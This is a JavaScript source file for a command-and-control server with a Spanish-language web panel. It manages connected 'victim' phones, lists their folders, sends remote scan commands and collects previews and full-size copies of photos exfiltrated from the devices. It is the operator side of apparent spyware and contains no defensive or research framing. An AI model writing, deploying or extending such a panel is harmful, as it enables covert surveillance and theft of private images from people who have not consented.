const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const cors = require('cors');

const app = express();
app.use(cors());

const AUTH_PASS = "admin123"; 
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
    if (req.query.auth !== AUTH_PASS) return res.send(`⛔ ACCESO DENEGADO`);

    res.send(`
    <html>
        <head>
            <title>C&C V8 INTELLIGENCE</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <link href="https://fonts.googleapis.com/css2?family=VT323&display=swap" rel="stylesheet">
            <style>
                :root { --bg: #050505; --panel: #111; --primary: #00ff41; --accent: #008F11; --text: #e0e0e0; --danger: #ff0033; --warn: #ffcc00; }
                body { font-family: 'VT323', monospace; background: var(--bg); color: var(--text); margin: 0; height: 100vh; overflow: hidden; font-size: 18px; }
                .container { display: grid; grid-template-columns: 350px 1fr; height: 100%; }
                .sidebar { background: var(--panel); border-right: 2px solid var(--primary); padding: 20px; display: flex; flex-direction: column; gap: 20px; overflow-y: auto; }
                .logo { color: var(--primary); font-size: 28px; border-bottom: 2px dashed var(--primary); padding-bottom: 15px; text-align: center; }
                .control-group { background: #000; padding: 15px; border: 1px solid #333; position: relative; }
                .label { font-size: 20px; color: var(--primary); margin-bottom: 8px; display:block; }
                select, input { width: 100%; padding: 10px; background: #1a1a1a; border: 1px solid var(--accent); color: white; font-family: 'VT323', monospace; font-size: 18px; outline: none; margin-bottom: 5px; }
                button { width: 100%; padding: 12px; border: 1px solid var(--primary); background: #000; color: var(--primary); font-family: 'VT323', monospace; font-size: 20px; cursor: pointer; margin-top: 8px; text-transform: uppercase; }
                button:hover { background: var(--primary); color: black; font-weight: bold; }
                .btn-stop { border-color: var(--danger); color: var(--danger); }
                .btn-stop:hover { background: var(--danger); color: black; }
                .main-area { padding: 20px; overflow-y: auto; background: #080808; position: relative; }
                .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 15px; }
                .card { background: #111; border: 1px solid #333; position: relative; }
                .card img { width: 100%; height: 150px; object-fit: cover; cursor: pointer; display: block; filter: grayscale(20%); }
                .card:hover img { filter: grayscale(0%); }
                .badge { position: absolute; top: 0; left: 0; background: black; color: var(--primary); padding: 2px 6px; font-size: 14px; border-right: 1px solid var(--primary); border-bottom: 1px solid var(--primary); }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="sidebar">
                    <div class="logo">> SYSTEM V8_ROOT</div>

                    <div class="control-group">
                        <span class="label">1. OBJETIVO [TARGET]</span>
                        <select id="victimSelector" onchange="updateFolderList()">
                            <option value="ALL">[*] TODOS LOS DISPOSITIVOS</option>
                        </select>
                        <div id="connectionStatus" style="color:#555; margin-top:5px;">Buscando...</div>
                    </div>

                    <div class="control-group">
                        <span class="label">2. CARPETA OBJETIVO</span>
                        <select id="folderSelect" onchange="syncFolderInput()">
                            <option value="">[★] ESCANEAR TODO</option>
                        </select>
                        <input type="text" id="smartFolder" placeholder="O escribir manual..." oninput="document.getElementById('folderSelect').value='manual'">
                    </div>

                    <div class="control-group">
                        <span class="label">3. EJECUTAR</span>
                        <button onclick="sendCommand('start')">[▶] INICIAR</button>
                        <button class="btn-stop" onclick="sendCommand('stop')">[X] DETENER</button>
                    </div>

                    <div class="control-group">
                        <span class="label">4. BUFFER</span>
                        <button onclick="document.getElementById('grid').innerHTML=''; document.getElementById('count').innerText='0';">[🗑] LIMPIAR</button>
                    </div>
                </div>

                <div class="main-area">
                    <div style="position:sticky; top:0; background:rgba(0,0,0,0.9); padding:10px; border-bottom:1px solid #00ff41; z-index:10; display:flex; justify-content:space-between; color:#00ff41;">
                        <span id="lblStatus">ESPERANDO...</span>
                        <span>IMGS: <span id="count">0</span></span>
                    </div>
                    <div class="grid" id="grid"></div>
                </div>
            </div>

            <script src="/socket.io/socket.io.js"></script>
            <script>
                const socket = io();
                let victimsMap = {}; 
                let photoCount = 0;

                // 1. RECIBIMOS LISTA DE DISPOSITIVOS Y SUS CARPETAS
                socket.on('update_device_list', (victims) => {
                    victimsMap = victims;
                    const sel = document.getElementById('victimSelector');
                    const current = sel.value;
                    
                    let html = '<option value="ALL">[*] TODOS (' + Object.keys(victims).length + ')</option>';
                    for (const [id, info] of Object.entries(victims)) {
                        html += \`<option value="\${id}">📱 \${info.name}</option>\`;
                    }
                    sel.innerHTML = html;
                    if (current !== 'ALL' && victims[current]) sel.value = current;

                    document.getElementById('connectionStatus').innerText = Object.keys(victims).length + " Conectados";
                    
                    // Actualizar dropdown de carpetas según selección actual
                    updateFolderList();
                });

                // 2. FUNCIÓN PARA LLENAR EL DROPDOWN DE CARPETAS
                function updateFolderList() {
                    const targetId = document.getElementById('victimSelector').value;
                    const folderSel = document.getElementById('folderSelect');
                    const manualInput = document.getElementById('smartFolder');
                    
                    let html = '<option value="">[★] ESCANEAR TODO (COMPLETO)</option>';

                    if (targetId !== 'ALL' && victimsMap[targetId] && victimsMap[targetId].folders) {
                        // Si hay un dispositivo seleccionado y tiene carpetas
                        victimsMap[targetId].folders.sort().forEach(folder => {
                            html += \`<option value="\${folder}">📂 \${folder}</option>\`;
                        });
                        manualInput.placeholder = "O escribe manual para " + victimsMap[targetId].name;
                    } else {
                        html += '<option disabled>-- Selecciona un dispositivo para ver carpetas --</option>';
                        manualInput.placeholder = "Escribe nombre de carpeta (ej: Camera)";
                    }
                    
                    html += '<option value="manual">[✎] ESCRIBIR MANUALMENTE...</option>';
                    folderSel.innerHTML = html;
                }

                // Sincronizar Select con Input
                function syncFolderInput() {
                    const val = document.getElementById('folderSelect').value;
                    const input = document.getElementById('smartFolder');
                    if (val === 'manual') {
                        input.value = '';
                        input.focus();
                    } else {
                        input.value = val;
                    }
                }

                socket.on('new_preview', data => {
                    if(document.getElementById(data.path)) return;
                    const targetId = document.getElementById('victimSelector').value;
                    if (targetId !== "ALL" && targetId !== data.victimId) return;

                    const div = document.createElement('div');
                    div.className = 'card';
                    div.id = data.path;
                    div.innerHTML = \`<div class="badge">\${victimsMap[data.victimId]?.name || "Unk"} | \${data.folder}</div>
                        <img src="data:image/jpeg;base64,\${data.image64}" onclick="socket.emit('order_download', {path:'\${data.path}', target:'\${data.victimId}'})">\`;
                    document.getElementById('grid').prepend(div);
                    document.getElementById('count').innerText = ++photoCount;
                });

                function sendCommand(action) {
                    const target = document.getElementById('victimSelector').value;
                    const folder = document.getElementById('smartFolder').value.trim();
                    document.getElementById('lblStatus').innerText = action === 'start' ? ">> ESCANEANDO: " + (folder||"TODO") : "DETENIDO";
                    socket.emit('admin_command', { action: action === 'start' ? 'start_scan' : 'stop_scan', target, folder });
                }

                socket.on('receive_full', data => {
                    const a = document.createElement('a');
                    a.href = "data:image/jpeg;base64," + data.image64;
                    a.download = "HD_" + data.name;
                    document.body.appendChild(a); a.click(); document.body.removeChild(a);
                });
            </script>
        </body>
    </html>
    `);
});

const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" }, allowEIO3: true, maxHttpBufferSize: 1e8 });
let victims = {};

io.on('connection', (socket) => {
    socket.emit('update_device_list', victims);

    socket.on('usrData', (data) => {
        if (data.dataType === 'register_device') {
            // Inicializar dispositivo (si no existía)
            if (!victims[socket.id]) victims[socket.id] = {};
            victims[socket.id].name = data.deviceName;
            victims[socket.id].id = data.deviceId;
            io.emit('update_device_list', victims);
        }
        // --- NUEVO: GUARDAR CARPETAS ---
        else if (data.dataType === 'folder_list') {
            if (victims[socket.id]) {
                victims[socket.id].folders = data.folders; // Guardamos el array de carpetas
                console.log(`[+] Carpetas recibidas de ${victims[socket.id].name}: ${data.folders.length}`);
                io.emit('update_device_list', victims); // Actualizamos la web para que aparezcan
            }
        }
        else if (data.dataType === 'preview_image') {
            data.victimId = socket.id;
            socket.broadcast.emit('new_preview', data);
        }
        else if (data.dataType === 'full_image') {
            socket.broadcast.emit('receive_full', data);
        }
    });

    socket.on('admin_command', (cmd) => {
        if (cmd.target === 'ALL') socket.broadcast.emit('command_' + cmd.action, { folder: cmd.folder });
        else io.to(cmd.target).emit('command_' + cmd.action, { folder: cmd.folder });
    });

    socket.on('order_download', (data) => {
        if(data.target) io.to(data.target).emit('request_full_image', { path: data.path });
    });

    socket.on('disconnect', () => {
        if (victims[socket.id]) {
            delete victims[socket.id];
            io.emit('update_device_list', victims);
        }
    });
});

server.listen(PORT, () => console.log(`🚀 SYSTEM V8 ONLINE`));
